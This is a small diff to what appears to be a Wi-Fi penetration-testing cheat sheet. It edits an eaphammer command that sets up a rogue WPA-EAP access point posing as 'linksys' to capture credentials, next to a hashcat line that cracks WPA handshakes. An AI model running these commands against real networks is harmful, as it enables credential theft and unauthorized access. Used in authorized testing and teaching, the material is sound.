@@ -93,7 +93,7 @@ hashcat -m 22000 hash.hc22000 /usr/share/john/password.lst
 #### eaphammer - alternative
 ```text
 sudo eaphammer --cert-wizard
-sudo eaphammer -i wlan0mon --channel 4 --auth wpa-eap --wpa-version 2 --essid linksys --creds
+sudo eaphammer -i wlan0mon --channel 4 --auth wpa-eap --essid linksys --creds
 ```
 
 
